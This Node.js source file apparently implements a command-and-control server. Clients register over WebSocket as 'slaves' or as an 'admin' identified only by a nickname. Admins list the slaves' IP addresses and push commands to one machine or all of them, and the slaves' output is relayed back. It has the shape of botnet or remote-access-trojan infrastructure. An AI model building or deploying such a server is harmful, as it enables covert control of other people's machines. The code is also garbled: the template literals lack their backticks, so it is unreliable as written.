const http = require("http");
const WebSocket = require("ws");

const ADMIN_LIST = ["Nonsense"];
const clients = new Map(); // Map<WebSocket, { nickname, isAdmin, ip }>
const pendingCommands = new Map(); // Map<slaveName, WebSocket(admin)>

const server = http.createServer((req, res) => {
  res.writeHead(200);
  res.end("WebSocket control server is running.");
});

const wss = new WebSocket.Server({ server });

wss.on("connection", (ws, req) => {
  const ip = req.socket.remoteAddress?.replace(/^.*:/, "") || "unknown";
  console.log([+] New connection from IP: ${ip});
  ws.send("Please send your nickname:");

  let registered = false;

  ws.on("message", (msg) => {
    const text = msg.toString().trim();

    if (!registered) {
      const nickname = text.slice(0, 32);
      const isAdmin = ADMIN_LIST.includes(nickname);
      clients.set(ws, { nickname, isAdmin, ip });
      registered = true;

      const role = isAdmin ? "ADMIN" : "SLAVE";
      console.log([+] ${role} connected: ${nickname} (${ip}));
      return;
    }

    const info = clients.get(ws);
    if (!info) return;

    const { nickname, isAdmin } = info;

    // ADMIN COMMANDS
    if (isAdmin) {
      // Show all slaves
      if (text === "/slaves") {
        const slaves = [];
        for (const [_, i] of clients.entries()) {
          if (!i.isAdmin) slaves.push(- ${i.nickname} (${i.ip}));
        }
        ws.send([INFO] Connected Slaves (${slaves.length}):\n${slaves.join("\n") || "None"});
        return;
      }

      // Command: /command <slave|all> <command>
      if (text.startsWith("/command ")) {
        const args = text.slice(9).trim().split(" ");
        const target = args.shift();
        const command = args.join(" ");

        if (!command) {
          ws.send("[ERROR] Missing command.");
          return;
        }

        if (target === "all") {
          console.log([!] Admin ${nickname} sent to ALL: ${command});
          for (const [client, i] of clients.entries()) {
            if (!i.isAdmin && client.readyState === WebSocket.OPEN) {
              client.send([COMMAND]: ${command});
              pendingCommands.set(i.nickname, ws);
              setTimeout(() => checkTimeout(i.nickname, ws), 5000);
            }
          }
        } else {
          const slaveSocket = findClientByNickname(target);
          if (slaveSocket && slaveSocket.readyState === WebSocket.OPEN && !clients.get(slaveSocket).isAdmin) {
            console.log([!] Admin ${nickname} → ${target}: ${command});
            slaveSocket.send([COMMAND]: ${command});
            pendingCommands.set(target, ws);
            setTimeout(() => checkTimeout(target, ws), 5000);
          } else {
            ws.send([ERROR] Slave '${target}' not found or disconnected.);
          }
        }

        return;
      }

      // Regular admin message
      console.log([ADMIN] ${nickname}: ${text});
      return;
    }

    // SLAVE RESPONSES
    if (text.startsWith("[OUTPUT]:") || text.startsWith("[ERROR]:") || text.startsWith("[EXCEPTION]:")) {
      const adminSocket = pendingCommands.get(nickname);
      const response = [${nickname}] ${text};
      if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
        adminSocket.send(response);
      } else {
        broadcastToAdmins(response);
      }
      pendingCommands.delete(nickname);
    } else {
      console.log([BLOCKED] Slave ${nickname} tried to speak: ${text});
    }
  });

  ws.on("close", () => {
    const info = clients.get(ws);
    if (info) {
      const role = info.isAdmin ? "ADMIN" : "SLAVE";
      console.log([-] ${role} disconnected: ${info.nickname} (${info.ip}));
      clients.delete(ws);
    }
  });

  ws.on("error", (err) => {
    console.error([ERROR] WebSocket error: ${err.message});
  });
});

// Helpers
function findClientByNickname(name) {
  for (const [client, info] of clients.entries()) {
    if (info.nickname === name) return client;
  }
  return null;
}

function broadcastToAdmins(msg) {
  for (const [client, info] of clients.entries()) {
    if (info.isAdmin && client.readyState === WebSocket.OPEN) {
      client.send(msg);
    }
  }
}

function checkTimeout(slaveName, adminSocket) {
  if (pendingCommands.has(slaveName)) {
    if (adminSocket.readyState === WebSocket.OPEN) {
      adminSocket.send([TIMEOUT] No response from ${slaveName} after 5 seconds.);
    }
    pendingCommands.delete(slaveName);
  }
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log([*] Server listening on port ${PORT});
});
